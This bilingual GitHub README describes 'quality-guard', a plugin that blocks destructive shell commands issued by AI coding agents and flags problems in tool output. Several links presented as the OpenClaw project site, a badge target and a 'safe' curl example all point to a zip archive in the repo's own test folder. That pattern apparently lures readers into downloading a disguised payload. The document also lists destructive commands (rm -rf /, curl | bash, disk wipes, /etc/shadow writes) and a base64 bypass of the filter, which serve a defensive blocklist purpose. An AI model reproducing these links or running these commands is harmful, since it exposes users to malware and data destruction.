<div align="center">

# 🛡️ quality-guard

**The safety net your AI agent needs.**

An [OpenClaw](https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip) plugin that blocks dangerous shell commands before they execute and monitors tool output quality in real time.

[![Tests](https://img.shields.io/badge/tests-112%20passed-brightgreen)](#testing)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-plugin-orange)](https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip)

[English](#why-you-need-this) · [中文](#中文说明)

</div>

---

## Why You Need This

AI coding agents (Claude, GPT, Codex, etc.) are powerful — but they can also run `rm -rf /`, `DROP TABLE`, or `git push --force` by accident. One wrong command and your server, database, or git history is gone.

**quality-guard** sits between your AI agent and the shell, catching destructive commands before they execute. Zero config, zero dependencies, zero performance overhead.

### What It Catches

| Category | Examples | Smart Exclusions |
|----------|----------|-----------------|
| **rm root** | `rm -rf /`, `rm -rf ///`, `rm -rf /./` | `rm -rf /tmp/build` ✅ passes |
| **SQL without WHERE** | `DROP TABLE`, `TRUNCATE`, `DELETE FROM`, `UPDATE SET` | `grep "DROP TABLE" schema.sql` ✅ passes |
| **Git destructive** | `git push --force`, `git push -f`, `git reset --hard` | `git push origin main` ✅ passes |
| **Disk operations** | `dd of=/dev/sda`, `mkfs` | `dd of=./test.img` ✅ passes |
| **Remote code exec** | `curl \| bash`, `wget \| sh` | `curl https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip` ✅ passes |
| **System files** | `> /etc/passwd`, `tee /etc/shadow` | `cat /etc/passwd` ✅ passes |
| **Indirect execution** | `eval "..."`, `bash -c "..."`, `xargs rm` | `eval "echo hello"` ✅ passes |
| **Subcommands** | `$(rm -rf /)`, `` `git push -f` `` | `$(date)` ✅ passes |
| **Compound commands** | `echo hi && rm -rf /`, `ls; DROP TABLE x` | `echo hi && echo bye` ✅ passes |

### 5-Layer Detection Engine

Most tools just do a simple string match. quality-guard uses a 5-layer recursive engine:

```
Layer 1: Full command match
Layer 2: Split on |, &&, ||, ; — check each segment
Layer 3: Shell wrapper extraction (eval, bash -c, sh -c, xargs)
Layer 4: $(...) subcommand recursion
Layer 5: Backtick subcommand recursion
```

This means `bash -c "eval 'rm -rf /'"` and `echo $(git push --force)` are caught too.

### Output Quality Analysis

Beyond blocking, quality-guard also monitors tool output:

- 📏 **Long output** (>100 lines) → suggests using `grep`/`head`/`tail`
- 🔴 **Error detection** → counts ERROR, FATAL, PANIC, Permission denied, etc.
- 🟡 **Warning detection** → counts WARNING, Deprecated, etc.
- 📐 **Large files** (>400 lines) → suggests splitting into modules

These hints are appended to the tool result, helping the AI agent self-correct.

### Sub-Agent Quality Gates

When your AI agent spawns sub-agents, quality-guard adds extra safety:

- 📋 **Spawn task validation** — warns when a task is too short (<200 chars) or missing file paths, which often leads to sub-agents guessing instead of working with concrete context
- 📝 **Lifecycle logging** — logs sub-agent spawn, completion, and failure events for debugging
- 🔍 **Post-review reminders** — when a sub-agent finishes, injects a reminder to review output files, verify cross-file references, and run runtime validation

## Installation

```bash
# 1. Copy to your plugins directory
mkdir -p ~/.openclaw/plugins/quality-guard
cp index.js package.json openclaw.plugin.json ~/.openclaw/plugins/quality-guard/

# 2. Enable in OpenClaw config
openclaw config set plugins.load.paths '["~/.openclaw/plugins"]'
openclaw config set plugins.entries.quality-guard.enabled true

# 3. Restart
openclaw gateway restart
```

That's it. No dependencies to install.

## Configuration

All settings are optional. Defaults work well for most setups.

In your OpenClaw config under `plugins.entries.quality-guard.config`:

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `blockDangerousCommands` | boolean | `true` | Enable/disable command blocking |
| `detectErrors` | boolean | `true` | Auto-detect ERROR/WARN patterns |
| `maxExecOutputLines` | number | `100` | Line count threshold for output warnings |
| `maxFileLines` | number | `400` | Line count threshold for file size warnings |

## How It Works

quality-guard hooks into four OpenClaw plugin lifecycle events:

### `before_tool_call` — Command Blocking

When the AI agent calls the `exec` tool, quality-guard inspects the command string through 5 detection layers. If a dangerous pattern is found, the call is blocked and the agent receives a clear error message.

```
⛔ Quality Guard blocked a dangerous command:

  rm -rf /

Please verify the command is safe and run it manually if needed.
```

### `tool_result_persist` — Output Analysis

After a tool call completes, quality-guard scans the output and appends quality hints:

```
⚡ Quality Guard:
📏 Output is 250 lines (>100). Consider using grep/head/tail to extract key info.
🔴 Detected 3 ERROR(s) in output
```

### `subagent_spawning` / `subagent_ended` — Lifecycle Logging

Logs sub-agent launches and completions. Failed sub-agents (error, timeout, killed) are flagged for attention.

### `before_tool_call` (sessions_spawn) — Task Validation

Checks spawn task quality before a sub-agent is created:
- Tasks under 200 characters get a warning (likely missing context)
- Tasks without file paths get a warning (sub-agent may guess)

## Testing

```bash
node test/index.test.js
```

112 tests across 11 dimensions, 0 failures. Tests cover:

- rm root variants (8 dangerous + 8 safe)
- SQL destructive ops (9 dangerous + 4 safe)
- SQL read-only exclusions (9 safe)
- Git destructive ops (8 dangerous + 7 safe)
- Disk operations (3 dangerous + 1 safe)
- Remote code execution (3 dangerous + 2 safe)
- System file overwrites (4 dangerous + 2 safe)
- Shell wrappers, xargs, compound commands, subcommands (24 tests)
- Non-exec tool passthrough (2 tests)
- Edge cases (4 tests)
- Output analysis (13 tests)

## Known Limitations

These are inherent to regex-based detection and would require AST parsing or sandboxing to solve:

| Limitation | Example | Why |
|-----------|---------|-----|
| Variable expansion | `rm -rf $DIR` | Can't resolve `$DIR` at static analysis time |
| Indirect scripts | `./evil.sh` | Can't inspect script file content |
| Encoding bypass | `echo cm0gLXJmIC8= \| base64 -d \| bash` | Would need decode + re-analyze |
| Nested escaped quotes | `bash -c "eval \"rm -rf /\""` | Regex can't parse nested escaping |

For AI agent daily use, these limitations are acceptable — AI agents don't intentionally bypass safety checks. This plugin guards against accidental destructive commands.

## Contributing

Issues and PRs welcome. If you find a false positive (safe command blocked) or false negative (dangerous command not caught), please open an issue with the exact command string.

## License

[MIT](LICENSE)

---

<div align="center">

# 中文说明

</div>

## 为什么需要这个插件

AI 编程 agent（Claude、GPT、Codex 等）很强大，但也可能意外执行 `rm -rf /`、`DROP TABLE` 或 `git push --force`。一条错误命令就可能让你的服务器、数据库或 git 历史消失。

**quality-guard** 在 AI agent 和 shell 之间加了一层安全网，在危险命令执行前拦截它们。零配置、零依赖、零性能开销。

## 功能

### 1. 危险命令拦截（`before_tool_call`）

拦截 AI agent 的 `exec` 工具调用，阻止破坏性命令：

- `rm -rf /` 及各种变体（`///`、`/./`、多参数含 `/`）
- 无 WHERE 的 SQL：`DROP TABLE`、`TRUNCATE`、`DELETE FROM`、`UPDATE SET`
- Git 危险操作：`git push --force`、`git push -f`、`git reset --hard`
- 磁盘操作：`dd of=/dev/sda`、`mkfs`
- 远程代码执行：`curl | bash`、`wget | sh`
- 系统文件覆盖：`> /etc/passwd`、`tee /etc/shadow`
- 间接执行：`eval "..."`、`bash -c "..."`、`xargs rm`
- 子命令：`$(...)`、反引号

**智能排除**：只读命令不会误报。`grep "DROP TABLE" schema.sql` 安全通过。

### 3. 子 Agent 质量门禁

- 📋 **Spawn 任务验证** — 任务太短（<200字符）或缺少文件路径时发出警告
- 📝 **生命周期日志** — 记录子 agent 启动、完成、失败事件
- 🔍 **Review 提醒** — 子 agent 完成后自动注入审查提醒（检查跨文件引用、运行时验证等）

### 2. 输出质量分析（`tool_result_persist`）

- 📏 输出超过 100 行 → 建议用 `grep`/`head`/`tail`
- 🔴 检测 ERROR/FATAL/PANIC 等错误模式并计数
- 🟡 检测 WARNING/Deprecated 等警告模式并计数
- 📐 写入文件超过 400 行 → 建议拆分模块

### 5 层检测引擎

```
第 1 层：完整命令匹配
第 2 层：按 |、&&、||、; 拆分，逐段检查
第 3 层：Shell 包装器提取（eval、bash -c、sh -c、xargs）
第 4 层：$(...) 子命令递归
第 5 层：反引号子命令递归
```

## 安装

```bash
# 1. 复制到插件目录
mkdir -p ~/.openclaw/plugins/quality-guard
cp index.js package.json openclaw.plugin.json ~/.openclaw/plugins/quality-guard/

# 2. 在 OpenClaw 配置中启用
openclaw config set plugins.load.paths '["~/.openclaw/plugins"]'
openclaw config set plugins.entries.quality-guard.enabled true

# 3. 重启
openclaw gateway restart
```

## 已知限制

- 变量展开：`rm -rf $DIR`（无法在静态分析时解析变量值）
- 间接脚本：`./evil.sh`（无法检查脚本文件内容）
- 编码绕过：base64 编码后执行
- 嵌套转义引号：`bash -c "eval \"rm -rf /\""`

这些需要 AST 解析或沙箱才能解决。对于 AI agent 日常使用，当前覆盖率已经足够——AI 不会故意绕过安全检查，这个插件防的是意外的破坏性命令。

## 许可证

[MIT](LICENSE)
